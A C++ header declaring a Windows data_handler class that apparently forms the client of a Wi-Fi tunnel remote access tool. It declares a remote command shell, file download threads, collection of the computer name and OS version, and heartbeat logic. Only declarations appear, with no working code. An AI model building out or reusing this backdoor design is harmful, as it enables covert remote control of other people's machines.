#ifndef _HANDLE_DATA_H_
#define _HANDLE_DATA_H_
#include "witunnel.h"
#include "gt_common.h"
#include <queue>

using std::queue;

typedef struct _META_DATA
{
	int length;
	BYTE *data;
}META_DATA;

typedef queue<META_DATA> data_queue;

class data_handler
{
public:
	static data_handler* get_instance();
	~data_handler();
	bool initialize();
	int start();

private:
	data_handler();
	static DWORD WINAPI send_receive_data_thread(_In_ LPVOID param);

	int connect();

	int send(TUNNEL_DATA_TYPE data_type, unsigned char *data, unsigned int len);

	void handle_connect(BYTE *pdata, int length);
	void handle_shell(BYTE *pdata, int length);
	void handle_file(BYTE *pdata, int length);

	// shell
	int cmdshell_init();
	int cmdshell_quit();
	int cmdshell_process_data(BYTE *pdata, DWORD length);
	static DWORD WINAPI cmdshell_thread(_In_ LPVOID param);

	// download
	static DWORD WINAPI download_thread(_In_ LPVOID param);

	void get_os_version();
	void printf_header(tunnel_data_header *tdh);

	int send_queue_empty();

public:
	static data_handler *handler_instance;

private:
	wifitunnel *witunnel;
	HANDLE receive_thread_handle;
	HANDLE send_thread_handle;

	bool is_running;
	bool is_connected;
	bool is_heartbeat;

	data_queue tunnel_send_queue;
	CRITICAL_SECTION critical_section_send;

	char computer_name[128];
	int computer_name_length;
	char os_version;

	unsigned char client_id;
	unsigned char server_id;
	unsigned char current_send_seq;
	unsigned char current_receive_seq;

	// cmdshell
	bool cmdshell_running;
	HANDLE cmdshell_read_handle;
	HANDLE cmdshell_write_handle;
	HANDLE cmdshell_thread_handle;
	HANDLE cmdshell_process_handle;
	PROCESS_INFORMATION cmdshell_process_info;

	// file
	char download_file_path[MAX_PATH];
	bool check_file();
	HANDLE download_thread_handle;
	bool downloading;

};

#endif // !_HANDLE_DATA_H_

